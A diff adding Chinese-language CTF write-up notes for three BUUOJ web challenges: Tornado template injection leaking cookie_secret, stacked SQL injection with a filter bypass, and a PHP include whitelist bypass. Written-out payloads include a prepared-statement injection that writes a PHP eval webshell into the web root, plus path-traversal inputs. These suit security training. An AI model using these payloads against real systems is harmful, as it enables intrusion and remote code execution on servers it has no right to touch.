@@ -1,5 +1,191 @@
 # web做题笔记
 
+## buuoj
+
+
+
+### easy_tornado
+
+tornado是一个python写的web服务器
+
+读取文件hint.txt:` md5(cookie_secret+md5(filename)) `
+
+我们只要找到cookie_secret 就能读取任意文件
+
+直接搜cve:找到一个\r\n分割请求的。。好像搞不到cookie_secret
+
+找到`error?msg=Error`模板注入???
+
+`{{1.}}`出现1.0  九成九模板注入，是什么模板?估计是自己的template
+
+cookie_secret在tornado.web.Application中
+
+黑名单:`",',(,),_,%,*,+,-,/,=,[,],\\,|`
+
+{{ {1,2,3} }}
+
+又是一次思维定势,老想着`__class__`啥的,后来被提醒一下，才意识到拿到cookie_secret并不需要命令执行,完全可以读类来获取信息
+
+有两种比较好的办法找到cookie_secret在哪
+
+- 写个脚本,把所有的类跑一边
+- 读代码找到可疑的类
+
+最后的payload:`{{handler.application.settings}}`
+
+` 'cookie_secret': 'f680f1d4-b940-40c2-9f82-0b1832c64479' `
+
+
+
+
+
+### 随便注
+
+禁用`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`
+
+emmmm还有creater...
+
+查询语句类似:`select xxx from xxx where xxx='1'`
+
+测试清单:
+
+```
+1#  没有闭合单引号却有查询结果
+1""""""" 可以查询到,猜测过滤了"
+
+0' "o"r 1#
+check the manual that corresponds to your MariaDB server version for the right syntax to use near 'r 1#'' at line 1</pre>
+正常的报错
+check the manual that corresponds to your MariaDB server version for the right syntax to use near '"o"r 1' at line 1
+////单纯的想多了
+extractvalue(1, concat(0x7e, (database()),0x7e));
+
+```
+
+用报错注入弄出数据库名:supersqli
+
+version:`10.3.18-MariaDB`
+
+host:6e161107d1dd
+
+port:3306
+
+dir:/var/lib/mysql/
+
+可以执行多条语句，
+
+```
+show variables like 'general_log';  -- 查看日志是否开启
+set global general_log=on; -- 开启日志功能
+show variables like 'general_log_file';  -- 看看日志文件保存位置
+set global general_log_file='tmp/general.lg'; -- 设置日志文件保存位置
+show variables like 'log_output';  -- 看看日志输出类型  table或file
+set global log_output='table'; -- 设置输出类型为 table
+set global log_output='file';   -- 设置输出类型为file
+
+```
+
+这些命令都可以执行
+
+试着写个webshell
+
+`1';set global general_log_file=0x2F7661722F7777772F68746D6C2F72652E706870;#`
+
+`1';set global general_log=on;`
+
+ webshell:Access denied. 
+
+草,用prepare执行预定义sql语句/////为啥我搜不到....
+
+```mysql
+1';Set @sql=concat("s","elect '<?php @eval($_POST[a]);?>' into outfile '/var/www/html/44",char(46),"php'");PREPARE sqla from @sql;EXECUTE sqla;
+```
+
+
+
+
+
+### warmup
+
+
+
+```php
+
+<?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&$page)
+        {
+            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
+            if (! isset($page) || !is_string($page)) {
+                echo "you can't see it";
+                return false;
+            }
+
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
+
+    if (! empty($_REQUEST['file'])
+        && is_string($_REQUEST['file'])
+        && emmm::checkFile($_REQUEST['file'])
+    ) {
+        include $_REQUEST['file'];
+        exit;
+    } else {
+        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
+    }  
+?>
+```
+
+
+
+```php
+
+ $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+```
+
+
+
+这里有个逻辑漏洞,如果我们构造`hint.php?`那么后面的内容随我们控制用../xxx来读取
+
+`hint.php?/../ffffllllaaaagggg`
+
+读取失败//////
+
+emmmmmm,flag在根目录
+
 ## jarvisoj
 
 ### re?
